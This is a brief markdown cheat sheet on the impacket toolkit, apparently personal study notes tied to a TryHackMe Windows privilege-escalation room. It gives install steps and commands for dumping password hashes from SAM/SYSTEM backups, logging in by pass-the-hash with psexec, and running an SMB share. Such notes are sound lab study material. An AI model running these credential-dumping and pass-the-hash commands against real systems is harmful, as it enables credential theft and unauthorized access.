# impacket

[![windowsprivesc20](../../../../cybersecurity/_badges/thmp/windowsprivesc20.svg)](https://tryhackme.com/room/windowsprivesc20)

<div class="row row-cols-md-2"><div>

[impacket](https://github.com/fortra/impacket) (11.1k ⭐) is a collection of [python](/programming-languages/high-level/scripting/python/index.md) classes for working with network protocols.

```shell!
$ sudo git clone https://github.com/fortra/impacket /opt/impacket
$ cd /opt/impacket
$ pip install -r requirements.txt
$ pip install .
```


</div><div>

#### Dump hashes from backup

Dump hashes from a backup of SAM and SYSTEM hashes.

```shell!
$ python /opt/impacket/examples/secretsdump.py -sam XXX -system YYY LOCAL
```

<br>

#### PsExec

Use a hash to login (Pass-The-Hash).

```shell!
$ python /opt/impacket/examples/psexec.py -hashes usernamehash:sessionhash username@IP
```

<br>

#### SMB server

Run a [SMB](../smb.md) server to which user will connect with the username XXX and the password YYY. Files will be stored in `/path/to/share`.

```shell!
$ python /opt/impacket/examples/smbserver.py -smb2support -username XXX -password YYY share_name /path/to/share
```
</div></div>